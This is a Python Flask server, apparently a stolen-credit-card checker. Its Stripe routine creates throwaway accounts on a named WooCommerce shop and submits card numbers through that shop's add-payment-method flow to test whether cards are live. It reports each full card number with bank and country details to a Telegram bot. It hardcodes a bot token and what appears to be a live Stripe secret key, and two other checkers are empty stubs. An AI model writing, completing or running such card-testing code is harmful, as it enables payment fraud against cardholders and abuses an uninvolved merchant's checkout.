from flask import Flask, request, jsonify
import requests
import re
import threading

# --- Configuration ---
BOT_TOKEN = '8964801226:AAGb4hVVFutU1Z751HiqvztabIUUUkxWm8M'
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"

app = Flask(__name__)

# --- Logic for Stripe Auth ---
def stripe_auth_check(cc, mm, yy, cvv):
    # ... (Stripe Auth ka poora logic yahan aayega)
    # ... (Yeh pehle se hi sahi kaam kar raha hai)
    session = requests.Session()
    session.headers.update({'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'})
    if len(yy) == 4: yy = yy[-2:]
    try:
        login_page_res = session.get('https://shop.wiseacrebrew.com/account/')
        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
        if not login_nonce_match: return {"status": "Declined", "response": "Failed to get login nonce.", "decline_type": "process_error"}
        login_nonce = login_nonce_match.group(1)
        random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'
        register_data = {'email': random_email, 'password': 'Password123!', 'woocommerce-register-nonce': login_nonce, '_wp_http_referer': '/account/', 'register': 'Register'}
        session.post('https://shop.wiseacrebrew.com/account/', data=register_data)
        payment_page_res = session.get('https://shop.wiseacrebrew.com/account/add-payment-method/')
        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
        if not payment_nonce_match: return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
        ajax_nonce = payment_nonce_match.group(1)
        stripe_data = (f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}'
                       '&key=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')
        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data)
        if stripe_response.status_code == 402:
            return {"status": "Declined", "response": stripe_response.json().get('error', {}).get('message', 'Declined by Stripe.'), "decline_type": "card_decline"}
        payment_token = stripe_response.json().get('id')
        if not payment_token: return {"status": "Declined", "response": "Failed to retrieve Stripe token.", "decline_type": "process_error"}
        site_data = {'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': payment_token, 'wc-stripe-payment-type': 'card', '_ajax_nonce': ajax_nonce}
        final_response = session.post('https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data)
        response_json = final_response.json()
        if response_json.get('success') is False or response_json.get('status') == 'error':
            error_message = (response_json.get('data', {}).get('error', {}).get('message') or re.sub('<[^<]+?>', '', response_json.get('messages', 'Declined by website.')))
            return {"status": "Declined", "response": error_message.strip(), "decline_type": "card_decline"}
        if response_json.get('status') == 'succeeded': return {"status": "Approved", "response": "Payment method successfully added.", "decline_type": "none"}
        else: return {"status": "Declined", "response": "Unknown response from website.", "decline_type": "process_error"}
    except Exception as e:
        return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}", "decline_type": "process_error"}

# --- Logic for Braintree Auth ---
def braintree_check(cc, mm, yy, cvv):
    # ... (Braintree ka poora logic yahan aayega)
    pass

# --- Logic for Stripe Charge ---
def stripe_charge_check(cc, mm, yy, cvv):
    # ... (Stripe Charge ka poora logic yahan aayega)
    pass

# --- BIN Info Function ---
def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}')
        return response.json() if response.status_code == 200 else {}
    except Exception: return {}

# --- Background Task Function ---
def background_task(chat_id, message_id, full_cc_string, gateway_function, gateway_name):
    cc, mm, yy, cvv = full_cc_string.split('|')
    check_result = gateway_function(cc, mm, yy, cvv)
    bin_info = get_bin_info(cc[:6])
    # ... (Message formatting logic same as before)
    status = check_result.get('status', 'Declined')
    response_message = check_result.get('response', 'No response.')
    brand = bin_info.get('brand', 'Unknown')
    card_type = bin_info.get('type', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    country_flag = bin_info.get('country_flag', '')
    bank = bin_info.get('bank', 'Unknown')
    if status == "Approved":
        final_message = f"""<b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ({gateway_name})</b>\n\n<b>𝗖𝗮𝗿𝗱:</b> <code>{full_cc_string}</code>\n<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response_message}\n\n<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}\n<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {bank}\n<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {country_flag}"""
    else:
        final_message = f"""<b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ({gateway_name})</b>\n\n<b>𝗖𝗮𝗿𝗱:</b> <code>{full_cc_string}</code>\n<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response_message}\n\n<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}\n<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {bank}\n<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {country_flag}"""
    payload = {'chat_id': chat_id, 'message_id': message_id, 'text': final_message, 'parse_mode': 'HTML'}
    requests.post(TELEGRAM_API_URL, json=payload)

# --- API Endpoints ---

# Endpoint for Stripe Auth (Fast)
@app.route('/stripe_auth', methods=['GET'])
def stripe_auth_endpoint():
    card_str = request.args.get('card')
    # ... (validation and calling logic)
    cc, mm, yy, cvv = card_str.split('|')
    check_result = stripe_auth_check(cc, mm, yy, cvv)
    bin_info = get_bin_info(cc[:6])
    final_result = {"status": check_result["status"], "response": check_result["response"], "bin_info": bin_info}
    return jsonify(final_result)

# Endpoint for Braintree (Slow, Asynchronous)
@app.route('/braintree', methods=['POST'])
def braintree_endpoint():
    data = request.get_json()
    # ... (validation)
    thread = threading.Thread(target=background_task, args=(data['chat_id'], data['message_id'], data['card'], braintree_check, "Braintree"))
    thread.start()
    return jsonify({"status": "Process started."})

# Endpoint for Stripe Charge (Slow, Asynchronous)
@app.route('/stripe_charge', methods=['POST'])
def stripe_charge_endpoint():
    data = request.get_json()
    # ... (validation)
    thread = threading.Thread(target=background_task, args=(data['chat_id'], data['message_id'], data['card'], stripe_charge_check, "Stripe Charge"))
    thread.start()
    return jsonify({"status": "Process started."})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
